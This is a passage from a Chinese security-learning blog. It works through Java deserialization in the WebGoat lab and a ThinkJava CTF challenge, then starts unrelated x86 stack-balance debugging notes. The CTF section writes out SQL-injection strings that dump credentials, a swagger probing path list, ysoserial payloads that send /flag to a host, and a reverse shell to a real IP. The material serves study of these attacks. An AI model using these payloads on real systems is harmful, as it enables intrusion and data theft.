序列化的类 ObjectOutputStream obj = new ObjectOutputStream(new FileOutputStream(\"ser.ser\")); /* * 方法writeObject用于将一个对象写入流中. 任何对象,包括字符串和数组,都是用writeObject编写的. 多个对象或原语可以写入流. * 必须从对应的ObjectInputstream读取对象,其类型和写入次序相同. */ // 需要序列化的对象是谁? obj.writeObject(person); obj.close(); } public static void main(String[] args) throws Exception{ Person person = new Person(\"hybcx\", 18); serializable(person); } } 跟进writeObject函数，阅读其注释可知： 在反序列化的过程当中，是针对对象本身，而非针对类的，因为静态属性是不参与序列化和反序列化的过程的。另外，如果属性本身声明了transient关键字，也会被忽略。但是如果某对象继承了A类，那么A类当中的对象的对象属性也是会被序列化和反序列化的(前提是A类也实现了java.io.Serializable接口) 4.2 如何反序列化类 序列化使用ObjectOutPutStream类，反序列化使用的则是ObjectInputStream类的readObject方法。我们在之前重写了readObject方法，所以会执行命令 Unserializable类实现： package serializable; import java.io.FileInputStream; import java.io.IOException; import java.io.ObjectInputStream; public class Unserializable { public static Object unserialize(String Filename) throws IOException, ClassNotFoundException { /* * ObjectInputStream反序列化先前使用ObjectOutputStream编写的原始数据和对象. * ObjectOutputStream和ObjectInputStream可以分别为与FileOutputStream和FileInputStream一起使用的对象图提供持久性存储的应用程序. * ObjectInputStream用于恢复先前序列化的对象. 其他用途包括使用套接字流在主机之间传递对象,或者在远程通信系统中进行封送和解组参数和参数. * ObjectInputStream确保从流中创建的图中的所有对象的类型与Java虚拟机中存在的类匹配. 根据需要使用标准机制加载类. * 只能从流中读取支持java.io.Serializable或java.io.Externalizable接口的对象. */ // 反序列化的类 ObjectInputStream ins = new ObjectInputStream((new FileInputStream(Filename))); /* * 方法readObject用于从流中读取对象. 应使用Java的安全铸造来获得所需的类型. 在Java中,字符串和数组是对象,在序列化过程中被视为对象. * 读取时,需要将其转换为预期类型. */ // 读出来并反序列化 Object obj = ins.readObject(); ins.close(); return obj; } public static void main(String[] args) throws Exception { Person person = (Person) unserialize(\"ser.ser\"); System.out.println(person); } } 其实反序列化的实现就是序列化的逆过程,会根据序列化读出数据的类型,进行相应的处理 4.3 serialVersionUID 序列化和反序列化可以理解为压缩和解压缩，但是压缩之所以能被解压缩的前提是因为他俩的协议是一样的。如果压缩是以四个字节为一个单位，而解压缩以八个字节为一个单位，就会乱套 同样在Java中与协议相对的概念为：serialVersionUID 当serialVersionUID不一致时，反序列化会直接抛出异常 比如设置为1L时序列化，修改为2L时反序列化，则会抛出异常 如上图，这里我们修改为2L，如下图发生报错， 我们跟进上图报错第二行的596那一行，发现下图情况：代码进行了判断suid != osc.getSerialVersionUID()如果两次UID不相同，则抛出异常 serializable.Person; local class incompatible: stream classdesc serialVersionUID = 1, local class serialVersionUID = 2 0x08 Java反序列化1实践 学了上述那么多前置知识，但我发现那些文章还有大把没讲完。。。。太多了需要慢慢啃，这里我就先复现一下看小迪课程的一些例子吧 8.1 序列化和反序列化过程 首先他这里给了一个简单序列化和反序列化代码 Main类实现： package SerialTest; import java.io.Serializable; public class Main { public static void main(String[] args) { // write your code here } } //定义Person类，用于后续序列化实例对象 class Person implements Serializable { private String name; private int age; private String sex; transient private int stuId; private static int count = 100; public Person(String name, int age, String sex, int stuId) { this.name = name; this.age = age; this.sex = sex; this.stuId = stuId; } //继承Person类 @Override public String toString() { return String.format( \"Person{name: %s, age: %d, sex: %s, stuId: %d, count: %d} \", name, age, sex, stuId, count ); } } SerializableTest类实现： package SerialTest; import java.io.*; public class SerializableTest { public static void main(String[] args) throws Exception { serialPerson(); Person person = deserialPerson(); System.out.println(person); } /** * Person对象序列化 * @throws IOException */ private static void serialPerson() throws IOException { Person person = new Person(\"xiaodi\", 28, \"男\", 101); //将Java对象的原始数据写入到outputstream,可使用ObjectInputStream读取,最后将数据写入到输出流File ObjectOutputStream oos = new ObjectOutputStream( new FileOutputStream(new File(\"person.txt\")) ); //将person实例对象进行序列化 oos.writeObject(person); System.out.println(\"person 对象序列化成功！\"); oos.close(); } /** * Person对象反序列化 * @return * @throws Exception */ private static Person deserialPerson() throws Exception { //恢复先前序列化的对象 ObjectInputStream ois = new ObjectInputStream( new FileInputStream(new File(\"hacker.txt\")) ); //反序列化数据流,也就是先前实力对象的序列化字节流 Person person = (Person)ois.readObject(); System.out.println(\"person 对象反序列化成功！\"); //Runtime.getRuntime().exec(\"calc.exe\"); return person; } } 我们运行之后如下图 同样的aced 0005开头 8.2 ysoserial工具使用 看了有几篇文章利用该工具的jar包进行一些常见Java反序列化1漏洞的链子分析…但对于看Java代码有些许困难的我，还是先学会如何在实战中使用吧 项目地址：https://github.com/frohoff/ysoserial --唉，要是这个项目持续更新就好了 这里的练习就用Java漏洞靶场webgoat来玩玩，不过tm搭建了半天，这新版本不会启动。。。。还是建议用8.2.2的版本吧 webgoat-Insecure Deserialization 找到相应关卡这里让我们更改序列化数据，让页面响应延迟5秒即可成功，那我们先可以验证一下这里是否存在反序列化注入点。 在此之前我们观察到上述序列化对象时r00ab开头，这说明是Java序列化数据经过base加密的结果，这里我们可以看一下源码进行验证 我们在上述输入1提交，抓一下包看一下Java对应的实现接口，如上图，我们可以发现接口地址为InsecureDeserialization/task，我们到其Java项目中找一下 如上图，我们可以看到该类在处理传入的token参数时，进行了base64的解密，这意味着我们如果构造了Java序列化恶意数据之后还需要进行base64的加密 这里我们用一下ysoserial工具，在这里作用大概就是可以凭借右侧依赖（对应的Java反序列化1漏洞点）直接根据用户输入的恶意数据生成依赖所对应的Java反序列化1漏洞的序列化数据。 这里我们用到的是上述命令URLDNS，我们利用dnslog平台回显来判断是否存在反序列化漏洞 java -jar ysoserial-all.jar URLDNS \"http://wqqly89hgl2qwlw44cadp2xdo4uvin6c.oastify.com\" &gt; urldns.txt 执行完后我们打开发现是aced开头，base64编码一下 import base64 file = open(\"urldns.txt\",\"rb\") now = file.read() ba = base64.b64encode(now) print(ba) file.close() 这里不知为何那些dnslog平台都崩了打不开，因此用了bp自带的进行了验证 点击上述copy复制后输入相关命令，最后将得到的文件数据进行一次base644加密输出 将得到的数据输入至下列输入框中，最后看到上图的bp中显示了最近一次的访问，验证成功 接下来利用执行系统命令来验证一次 java -Dhibernate5 -cp hibernate-core-5.4.28.Final.jar;ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.GeneratePayload Hibernate1 \"calc.exe\" &gt; 1.bin 这里的hibernate-core-5.4.9.Final.jar我们可以看一下这里 如上图可以看到这里是支持Hibernate的，因此我们需要在webgoat的jar包中找到相关的 如上图我们找到了hibernate-core-5.4.28.Final.jar一般都是找core这个包的，这是插件的核心 如图执行成功后我们打开x.bin看一下，如下图可以看到是以aced开头的，接下来用个Python脚本编码一下 这里编译好直接输入至输入框中即可，但这里不知道为何我弹不出计算器 这里先尝试延迟5秒吧，这里由于是windows环境，就是ping来实现 InsecureDeserializationTask.java package org.owasp.webgoat.deserialization; import org.dummy.insecure.framework.VulnerableTaskHolder; import org.owasp.webgoat.assignments.AssignmentEndpoint; import org.owasp.webgoat.assignments.AssignmentHints; import org.owasp.webgoat.assignments.AttackResult; import org.springframework.web.bind.annotation.PostMapping; import org.springframework.web.bind.annotation.RequestParam; import org.springframework.web.bind.annotation.ResponseBody; import org.springframework.web.bind.annotation.RestController; import java.io.ByteArrayInputStream; import java.io.IOException; import java.io.InvalidClassException; import java.io.ObjectInputStream; import java.util.Base64; @RestController @AssignmentHints({\"insecure-deserialization.hints.1\", \"insecure-deserialization.hints.2\", \"insecure-deserialization.hints.3\"}) public class InsecureDeserializationTask extends AssignmentEndpoint { @PostMapping(\"/InsecureDeserialization/task\") @ResponseBody public AttackResult completed(@RequestParam String token) throws IOException { String b64token; long before; long after; int delay; b64token = token.replace('-', '+').replace('_', '/'); try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(b64token)))) { before = System.currentTimeMillis(); Object o = ois.readObject(); if (!(o instanceof VulnerableTaskHolder)) { if (o instanceof String) { return failed(this).feedback(\"insecure-deserialization.stringobject\").build(); } return failed(this).feedback(\"insecure-deserialization.wrongobject\").build(); } after = System.currentTimeMillis(); } catch (InvalidClassException e) { return failed(this).feedback(\"insecure-deserialization.invalidversion\").build(); } catch (IllegalArgumentException e) { return failed(this).feedback(\"insecure-deserialization.expired\").build(); } catch (Exception e) { return failed(this).feedback(\"insecure-deserialization.invalidversion\").build(); } delay = (int) (after - before); System.out.println(delay); if (delay &gt; 7000) { return failed(this).build(); } if (delay &lt; 3000) { return failed(this).build(); } return success(this).build(); } } 这里可以看到，程序对post传入的token进行了base64的解码，并用replace做了一定过滤，接着Object o = ois.readObject();送入readobject进行反序列化。如果反序列化的对象o不是VulnerableTaskHolder类的话就会抛出错误，接着最后判断delay的大小，我们需要控制在7-3秒内 我们转到VulnerableTaskHolder类的实现，如下列代码， package org.dummy.insecure.framework; import lombok.extern.slf4j.Slf4j; import java.io.BufferedReader; import java.io.IOException; import java.io.InputStreamReader; import java.io.ObjectInputStream; import java.io.Serializable; import java.time.LocalDateTime; @Slf4j public class VulnerableTaskHolder implements Serializable { private static final long serialVersionUID = 2; private String taskName; private String taskAction; private LocalDateTime requestedExecutionTime; public VulnerableTaskHolder(String taskName, String taskAction) { super(); this.taskName = taskName; this.taskAction = taskAction; this.requestedExecutionTime = LocalDateTime.now(); } @Override public String toString() { return \"VulnerableTaskHolder [taskName=\" + taskName + \", taskAction=\" + taskAction + \", requestedExecutionTime=\" + requestedExecutionTime + \"]\"; } /** * Execute a task when de-serializing a saved or received object. * @author stupid develop */ private void readObject( ObjectInputStream stream ) throws Exception { //unserialize data so taskName and taskAction are available stream.defaultReadObject(); //do something with the data log.info(\"restoring task: {}\", taskName); log.info(\"restoring time: {}\", requestedExecutionTime); if (requestedExecutionTime!=null &amp;&amp; (requestedExecutionTime.isBefore(LocalDateTime.now().minusMinutes(10)) || requestedExecutionTime.isAfter(LocalDateTime.now()))) { //do nothing is the time is not within 10 minutes after the object has been created log.debug(this.toString()); throw new IllegalArgumentException(\"outdated\"); } //condition is here to prevent you from destroying the goat altogether if ((taskAction.startsWith(\"sleep\")||taskAction.startsWith(\"ping\")) &amp;&amp; taskAction.length() &lt; 22) { log.info(\"about to execute: {}\", taskAction); try { Process p = Runtime.getRuntime().exec(taskAction); BufferedReader in = new BufferedReader( new InputStreamReader(p.getInputStream())); String line = null; while ((line = in.readLine()) != null) { log.info(line); } } catch (IOException e) { log.error(\"IO Exception\", e); } } } } 这里代码中重写了readobject函数，并且通过条件语句限制了只能使用sleep或ping在linux与windows环境下实现延迟效果，最后通过Process p = Runtime.getRuntime().exec(taskAction);来触发命令执行。 SerializationHelper里面提供了一些工具类 package org.owasp.webgoat.deserialization; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.DataOutputStream; import java.io.IOException; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.Serializable; import java.util.Base64; public class SerializationHelper { private static final char[] hexArray = \"0123456789ABCDEF\".toCharArray(); public static Object fromString(String s) throws IOException, ClassNotFoundException { byte[] data = Base64.getDecoder().decode(s); ObjectInputStream ois = new ObjectInputStream( new ByteArrayInputStream(data)); Object o = ois.readObject(); ois.close(); return o; } public static String toString(Serializable o) throws IOException { ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(o); oos.close(); return Base64.getEncoder().encodeToString(baos.toByteArray()); } public static String show() throws IOException { ByteArrayOutputStream baos = new ByteArrayOutputStream(); DataOutputStream dos = new DataOutputStream(baos); dos.writeLong(-8699352886133051976L); dos.close(); byte[] longBytes = baos.toByteArray(); return bytesToHex(longBytes); } public static String bytesToHex(byte[] bytes) { char[] hexChars = new char[bytes.length * 2]; for (int j = 0; j &lt; bytes.length; j++) { int v = bytes[j] &amp; 0xFF; hexChars[j * 2] = hexArray[v &gt;&gt;&gt; 4]; hexChars[j * 2 + 1] = hexArray[v &amp; 0x0F]; } return new String(hexChars); } } 接下来就是构造反序列化的payload，我们在webgoat源码中VulnerableTaskHolder所在的目录下新建一个java类，其中的内容写我们需要的恶意代码，如下图所示 package org.dummy.insecure.framework; import java.io.ByteArrayOutputStream; import java.io.ObjectOutputStream; import java.util.Base64; public class SerialMain { static public void main(String[] args){ try{ //向VulnerableTaskHolder类传入ping命令 VulnerableTaskHolder go = new VulnerableTaskHolder(\"ping\", \"ping -n 6 127.0.0.1\"); //创建一个 ByteArrayOutputStream 对象，用于存储序列化后的字节数据。 ByteArrayOutputStream bos = new ByteArrayOutputStream(); //创建一个 ObjectOutputStream 对象，用于将对象序列化到 ByteArrayOutputStream ObjectOutputStream oos = new ObjectOutputStream(bos); //进行反序列化 oos.writeObject(go); //刷新 ObjectOutputStream，确保所有数据都被写入到 ByteArrayOutputStream。 oos.flush(); //获取 ByteArrayOutputStream 中的字节数组。 byte[] exploit = bos.toByteArray(); //将字节数组进行 Base64 编码，得到一个 Base64 编码的字符串。 String exp = Base64.getEncoder().encodeToString(exploit); System.out.println(exp); } catch (Exception e){ } } } 代码内容如上图，执行SerialMain后生成token，复制到token处提交。 从console可以看到执行了ping命令，且task任务的响应也会变慢。 如上图成功通过，然后我在解决上述问题的时候突然看到这个webgoat的版本适配的是jdk15，然后我就下载了15的来重新运行webgoat，随后又尝试弹calc，tmd竟然成了！！！—这感觉就是纯纯jdk版本适配问题啊。。。。。。。。。。。还有一点，我在使用bp的collaborator时，一直连接不上去，翻了多个文章发现是校园网的问题。。。。。无语住了 8.3 SerializationDumper 数据分析 项目地址：https://github.com/NickstaDB/SerializationDumper 这个可以用来进行Java反序列化1payload之类的数据分析 java -jar SerializationDumper-v1.13.jar -r 1.bin &gt; 1.txt 如图所示，可以较为清楚的展示Java反序列化1数据 8.4 [网鼎杯 2020 朱雀组]ThinkJava 访问首页说没有身份权限，那估计需要先root一下，这里先看题目给的附件 // // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package cn.abc.core.controller; import cn.abc.common.bean.ResponseCode; import cn.abc.common.bean.ResponseResult; import cn.abc.common.security.annotation.Access; import cn.abc.core.sqldict.SqlDict; import cn.abc.core.sqldict.Table; import io.swagger.annotations.ApiOperation; import java.io.IOException; import java.util.List; import org.springframework.web.bind.annotation.CrossOrigin; import org.springframework.web.bind.annotation.PostMapping; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RestController; @CrossOrigin @RestController @RequestMapping({\"/common/test\"}) public class Test { public Test() { } @PostMapping({\"/sqlDict\"}) @Access @ApiOperation(\"为了开发方便对应数据库字典查询\") public ResponseResult sqlDict(String dbName) throws IOException { List&lt;Table&gt; tables = SqlDict.getTableData(dbName, \"root\", \"abc@12345\"); return ResponseResult.e(ResponseCode.OK, tables); } } 这里给了一个/common/test接口，其中会访问sqlDict接口，接着传入了数据库的账号和密码，我们转到sqlDict看看 // // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package cn.abc.core.sqldict; import java.sql.Connection; import java.sql.DatabaseMetaData; import java.sql.DriverManager; import java.sql.ResultSet; import java.sql.SQLException; import java.sql.Statement; import java.util.ArrayList; import java.util.List; public class SqlDict { public SqlDict() { } public static Connection getConnection(String dbName, String user, String pass) { Connection conn = null; try { Class.forName(\"com.mysql.jdbc.Driver\"); if (dbName != null &amp;&amp; !dbName.equals(\"\")) { dbName = \"jdbc:mysql://mysqldbserver:3306/\" + dbName; } else { dbName = \"jdbc:mysql://mysqldbserver:3306/myapp\"; } if (user == null || dbName.equals(\"\")) { user = \"root\"; } if (pass == null || dbName.equals(\"\")) { pass = \"abc@12345\"; } conn = DriverManager.getConnection(dbName, user, pass); } catch (ClassNotFoundException var5) { var5.printStackTrace(); } catch (SQLException var6) { var6.printStackTrace(); } return conn; } public static List&lt;Table&gt; getTableData(String dbName, String user, String pass) { List&lt;Table&gt; Tables = new ArrayList(); Connection conn = getConnection(dbName, user, pass); String TableName = \"\"; try { Statement stmt = conn.createStatement(); DatabaseMetaData metaData = conn.getMetaData(); ResultSet tableNames = metaData.getTables((String)null, (String)null, (String)null, new String[]{\"TABLE\"}); while(tableNames.next()) { TableName = tableNames.getString(3); Table table = new Table(); String sql = \"Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = '\" + dbName + \"' and table_name='\" + TableName + \"';\"; ResultSet rs = stmt.executeQuery(sql); while(rs.next()) { table.setTableDescribe(rs.getString(\"TABLE_COMMENT\")); } table.setTableName(TableName); ResultSet data = metaData.getColumns(conn.getCatalog(), (String)null, TableName, \"\"); ResultSet rs2 = metaData.getPrimaryKeys(conn.getCatalog(), (String)null, TableName); String PK; for(PK = \"\"; rs2.next(); PK = rs2.getString(4)) { } while(data.next()) { Row row = new Row(data.getString(\"COLUMN_NAME\"), data.getString(\"TYPE_NAME\"), data.getString(\"COLUMN_DEF\"), data.getString(\"NULLABLE\").equals(\"1\") ? \"YES\" : \"NO\", data.getString(\"IS_AUTOINCREMENT\"), data.getString(\"REMARKS\"), data.getString(\"COLUMN_NAME\").equals(PK) ? \"true\" : null, data.getString(\"COLUMN_SIZE\")); table.list.add(row); } Tables.add(table); } } catch (SQLException var16) { var16.printStackTrace(); } return Tables; } } 这里看到getTableData用来查询数据库数据，其中sql语句没做过滤，存在sql注入，但我们在test中会看到如下图，导入的包中含有swagger 我们百度查一下相关资料： Swagger是一个规范和完整的框架，用于生成、描述、调用和可视化 RESTful 风格的 Web 服务，JAVA在金融机构开发语言的地位一直居高不下，而作为JAVA届服务端的大一统框架Spring，便将Swagger规范纳入自身的标准，建立了Spring-swagger项目，所以在实际测试环境中，基于spring框架的swagger-ui接口展示及调试文档页面最为常见。 这里我们搜的时候会发现他会提示有个swagger-ui漏洞，那我们继续了解一下会发现这玩意儿存在未授权访问漏洞 /api /api-docs /api-docs/swagger.json /api.html /api/api-docs /api/apidocs /api/doc /api/swagger /api/swagger-ui /api/swagger-ui.html /api/swagger-ui.html/ /api/swagger-ui.json /api/swagger.json /api/swagger/ /api/swagger/ui /api/swagger/ui/ /api/swaggerui /api/swaggerui/ /api/v1/ /api/v1/api-docs /api/v1/apidocs /api/v1/swagger /api/v1/swagger-ui /api/v1/swagger-ui.html /api/v1/swagger-ui.json /api/v1/swagger.json /api/v1/swagger/ /api/v2 /api/v2/api-docs /api/v2/apidocs /api/v2/swagger /api/v2/swagger-ui /api/v2/swagger-ui.html /api/v2/swagger-ui.json /api/v2/swagger.json /api/v2/swagger/ /api/v3 /apidocs /apidocs/swagger.json /doc.html /docs/ /druid/index.html /graphql /libs/swaggerui /libs/swaggerui/ /spring-security-oauth-resource/swagger-ui.html /spring-security-rest/api/swagger-ui.html /sw/swagger-ui.html /swagger /swagger-resources /swagger-resources/configuration/security /swagger-resources/configuration/security/ /swagger-resources/configuration/ui /swagger-resources/configuration/ui/ /swagger-ui /swagger-ui.html /swagger-ui.html#/api-memory-controller /swagger-ui.html/ /swagger-ui.json /swagger-ui/swagger.json /swagger.json /swagger.yml /swagger/ /swagger/index.html /swagger/static/index.html /swagger/swagger-ui.html /swagger/ui/ /Swagger/ui/index /swagger/ui/index /swagger/v1/swagger.json /swagger/v2/swagger.json /template/swagger-ui.html /user/swagger-ui.html /user/swagger-ui.html/ /v1.x/swagger-ui.html /v1/api-docs /v1/swagger.json /v2/api-docs /v3/api-docs 这里也是看了wp要访问swagger-ui.html页面 查看一番发现其有三个接口，对应着题目附件中源码中的java文件，我们可以现在dbName处进行sql注入拿到账号密码 不过这里涉及到了jdbc的sql注入，这里先跟着浅学一下，一会儿深入，我们定位到下图 这里看师傅们说这里由于进行了dbName的拼接，那我们在进行sql注入的时候要满足jdbc协议的连接不能出错，因此这里会用到类似url的锚点（这里做完在了解什么是锚点） jdbc sql 注入 关于#的使用 在url中#表示锚点，表示网页中的一个位置，比如http:xxx/index.html#aaa，浏览器读取这个url，会将aaa移到可视位置。在第一个#，都会被视为位置标识符，不会被发送到服务端 而jdbc类似于url解析，所以会忽略#后面的字符 而#又是sql注入中的注释符，如果我们需要在url中传#，那么需要进行url编码为%23 查看数据库，这里是get传参，这里测试了几波发现需要将单引号，#和空格进行url编码 ?dbName=myapp%23%27%20union%20select%20group_concat(SCHEMA_NAME)from(information_schema.schemata)%23 爆表名dbName=myapp%23%27%20union%20select%20group_concat(table_name)from(information_schema.tables)where(table_schema%3D%27myapp%27)%23 爆字段名： dbName=myapp%23%27%20union%20select%20group_concat(column_name)from(information_schema.columns)where((table_schema%3D%27myapp%27)and(table_name%3D%27user%27))%23 爆用户名密码： dbName=myapp%23%27%20union%20select%20group_concat(name,0x3a,pwd)from%20user%23 这样的话就拿到了用户账号和密码，使用账号密码登录 如上图，登陆成功 往下翻可以看到这里的body部分存在r00ab开头的，这很明显就是Java反序列化1经过base64编码后的结果，那我们验证一下这里是否存在Java反序列化1漏洞 如上图，我们使用的是bp自带的插件，如上图，我们发现确实存在反序列化漏洞 接下来使用ysoserial打 ysoserial java -jar ysoserial-all.jar ROME \"curl http://ip:5555 -d @/flag\" &gt; 1.bin bash -i &gt;&amp; /dev/tcp/124.220.233.26/5555 0&gt;&amp;1 java -jar ysoserial-all.jar ROME \"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIwLjIzMy4yNi81NTU1IDA+JjE=}|{base64,-d}|{bash,-i}\" &gt; 1.bin 上述命令打完记得base64编码 本来我们分析道Authorization会将用户的token信息进行Java序列化并编码，那我们就可以构造而已的Java序列化数据传给Authorization，这样在解析的时候就会反序列化我们的恶意数据，进而拿到shell等。 这里问了一下GPT上述payload的含义： 这段命令使用`curl`工具进行HTTP请求，并包含了一些参数和选项。让我们逐步解释这个命令： 1. `curl`: 是一个命令行工具，用于在Unix和类Unix系统中传输数据，支持多种协议，包括HTTP。 2. `http://xxx`: 指定了要访问的URL，其中`xxx`是占位符。你需要替换它为实际的目标URL。 3. `-d`: 这是`curl`的一个选项，用于指定要发送的数据。在这个例子中，`-d @/flag`表示将`/flag`文件中的数据作为POST请求的主体数据发送到指定的URL。`@`符号告诉`curl`从文件中读取数据。 总的来说，这个命令的目的是通过HTTP POST请求将`/flag`文件的内容发送到指定的URL（替换为实际的目标URL）。在实际应用中，请确保你了解并授权了发送数据的操作，以免不当使用。 接着尝试一下反弹shell，命令如下： bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1 --进行base64编码 java -jar ysoserial-all.jar ROME \"bash -c {echo,编码内容}|{base64,-d}|{bash,-i}\" &gt; 1.bin --进行base64编码 接着发送至current接口即可，如下图成功拿到shell 这里我们用ysoserial对用户登录成功的数据分析一下 Bearer rO0ABXNyABhjbi5hYmMuY29yZS5tb2RlbC5Vc2VyVm92RkMxewT0OgIAAkwAAmlkdAAQTGphdmEvbGFuZy9Mb25nO0wABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyAA5qYXZhLmxhbmcuTG9uZzuL5JDMjyPfAgABSgAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAAAAAAAXQABWFkbWlu 不过在此之前需要将上述转为16进制，这里依旧用个python脚本 import base64 a = \"rO0ABXNyABhjbi5hYmMuY29yZS5tb2RlbC5Vc2VyVm92RkMxewT0OgIAAkwAAmlkdAAQTGphdmEvbGFuZy9Mb25nO0wABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyAA5qYXZhLmxhbmcuTG9uZzuL5JDMjyPfAgABSgAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAAAAAAAXQABWFkbWlu\" b = base64.b64decode(a).encode('hex') print(b) 我们进入文件会发现如下图，name中含有admin，说明这里代码通过反序列化Java数据来判断其中name的值是否为admin 0x09 参考文章 Java反序列化1： Java 反序列化漏洞入门 Java反序列化1从入门到放弃 浅显易懂的Java反序列化1入门 Java反射： JAVA反射学习 初探java安全之反射(2) Java反射 webgoat： 0基础学渗透-WebGoat靶场（五） WebGoat8.0 Insecure Deserialization webgoat-Insecure Deserialization不安全的序列化 WebGoat-8.2.2靶场之不安全的反序列化漏洞 Swagger未授权访问漏洞 [网鼎杯 2020 朱雀组]Think Java -1 [网鼎杯 2020 朱雀组]Think Java -2 CTFHUB-think_java(2020-网鼎杯-朱雀组-Web-think_java)","tags":["Java反序列化"],"categories":["Java反序列化"]},{"title":"堆栈平衡的学习","path":"/2023/11/22/qian-xi-dui-zhan-ping-heng/","content":"0x01 堆栈平衡 #include&lt;stdio.h&gt; int Hello(int a, int b){ return a+b; } int main(){ int a = 1; int b = 2; Hello(a,b); return 0; } 上述写的简单的C程序，我们先找寻一下main函数入口，这里毕竟我也是菜鸡，看了几篇文章感觉还是不太会找入口，于是又想着用IDA打开找main函数，果不其然找到了 我们在dgb对应地址上打个断点运行到main函数位置，运行到此处。 这里又找到了滴水逆向的课件，于是我想着直接换成自带的helloworld.exe来画堆栈图 至于为何是图中的地址，这里也是跟着教程走的，没别的原因。先记录一下esp与ebp寄存器地址（记得点断点之后运行到此处） EBP为栈底，ESP为栈顶，接着我们F8步走。这个黄色就代表了，在我们调用之前，你原始的堆栈就是这样的，这里面的数据是在我的程序在执行之前就已经被占用的了 可以看到栈底未变化，栈顶发生了变化（-4），这里是由于我们push 2这一步的原因 右下角也可以看到2的产生，这代表2已经写入堆栈中了，这一过程叫做压栈。 再F8步走一下，如下图1也成功入栈，地址也发生变化 接着下一步就不能直接F8了，因为这回的指令为call，适用于调用函数的，如果直接F8，就到了add esp的一步，而我们是想要进入这个函数内部的，因此这里需要F7步进，call函数左后肯定会对应一个ret（用于终止当前函数的运行，即回收当前函数的帧）。这里看到教程说，call这个函数修改EIP值的同时，还会将这行指令的地址压入栈中。 地址值：EIP+指令长度 这里也不是很清楚指令长度代表多少，不过倒是可以计算器算出来。。。 这里与上图比较看到ESP又-4，当我们再提到函数的返回地址，说的就是call调用的时候，栈里面被压入的值。 这里也可以看到其中含有JMP指令：无条件转移到标号为label的位置。也就是跳转指令，跳转到指定位置。这里看的教程说是不需要理他，直接回车就行。 这里回车后再看一下EIP的值，我们与上面比较的话会发现，这个值与call调用的时候的地址一样，这里教程说是JMP相当于mov值给EIP，故此EIP的值会变化。接着我们老规矩F8。 这里可以看到在push EBP之后，ESP的值又-4，同时我们可以看到右下角栈顶的值就是当前EBP的值。 这里继续F8看到上图在mov EBP， ESP之后看到右上角发现，EBP=ESP（本质意义就算是栈底提高了） 同时我们发现下一步的sub esp,40，依据上图的解释这里不难看出，我们esp的值-40，由于40是十六进制，所以相当于十进制的16，故此要上升16格。 之后我们F8来核对一下我们计算是否正确： 如上图，发现esp的值与我们画的堆栈图是一致的。这里介绍一下缓冲区的概念： 缓冲区的概念：任何一段程序在执行都需要一点空间，不给我一块内存怎么执行，所以需要一块空间叫做缓冲区，缓冲区的大小时不确定的，他会根据你需要的多少来分 上图是PUSH EBX的结果。在这里附上文章的解释： 为什么程序要这么设计：因为你让CPU干活，让他去执行一段功能，我们需要给他分一块内存，所以上面为什么有一条SUB ESP，40这个原因，为什么还有一堆PUSH EBX ESI EDI这些东西，我们要执行一段程序，如果说我们现在在玩游戏，一共30关现在玩到了29关，现在突然想起来我要去吃饭，吃饭就相当于我要执行另外一段程序，如果你吃完饭回来发现你要从第一关开始你干不干，所以一样的道理，所以这些寄存器一共就这些个，在我们用之前是不是我们需要把他保留起来，等我们执行完了，我们再还原回来，所以PUSH 那三个寄存器的步骤我们可以理解为保存现场，寄存器里面存的值保存到哪里去，我们再编程的时候，就两个地方可以保存进去，一个是寄存器，一个是内存，那保存到哪个内存里面，那么正好是我们现在用的堆栈 这里我们执行一下push ebx与edi，那根据计算我们push之后，esp的值应该以E8C结尾 接着我们验证一下，如下图验证成功，ebx，edi成功入栈（可以看到右下角的栈中含有上面EDI,EBX的地址值） 这里修改一下上面的堆栈图（有所错误），如下图，我们的EBP是在前几步已经变了的，我这里忘记改了。 LEA是取地址编号的，取EBP-40这块的地址编号然后放到EDI里面，这里经过计算呢，我们的EDI的值应该是以FE98结尾的，我们F8验证一下 可以看到验证成功，但再细看一下发现其他寄存器的值如EBP，ESP的值并未发生变化。 说明LEA只是单纯改变EDI的值。 接下来分析： MOV ECX,10 MOV EAX,CCCCCCCC REP STOS DWORD PTR ES:[EDI] 但这里不知为何，这里的代码与上述图中不符，问了GPT发现功能是相同的，但使用的命令不一样罢了 是的，这两者在功能上是相同的。 1. `REP STOS DWORD PTR ES:[EDI]` 中的 `STOS` 是存储字节或双字节的指令，而 `DWORD PTR` 表示操作数是一个双字（32位）。 2. `REP STOSD` 中的 `STOSD` 也是存储双字节的指令，其中 `D` 表示双字。 因此，这两者都是重复执行相同的存储操作，只是指定的方式略有不同。前者使用了显式的地址表示（`DWORD PTR ES:[EDI]`），而后者直接使用默认的寄存器（`STOSD`）。在实际使用中，选择哪个取决于具体的需求和编程上的偏好。 这里看wp说是REP会受到ECX的影响，ECX的值是多少REP就执行几次，这里是执行16次，因为10是十六进制 这里呢，先是将ECX赋值为10，其次将EAX赋值为CCCCCCCC，这里STOS的作用是： 将EAX的值赋值给EDI这个地址编号指向的内存，这个里面的EDI会自动加4或者减4，这是有D位决定的，D位为0就是加（不过对于这个解释没太懂）。而这三条命令加起来意思就是：每次将EAX这一串CC放入EDI所指向的地址，共操作16次，但每次放入之后EDI会+4，+4后ECX会自动-1，CC相当于init3，相当于断点，防止缓冲区溢出。 那我们分析一下堆栈图，在上面的我们知道EDI当前地址为0019FE98，也就是下图 那这里需要操作16次，也就是我们从E98那里开始一直到EBP的上面一格，共16格，都将会成为CC这一串字符 最终结果如上图，接下来我们验证一下上述的讨论 如上图，这里是未变化之前，如下图，可以看到，在94一直到D8之间的都变成了CC，验证成功 MOV 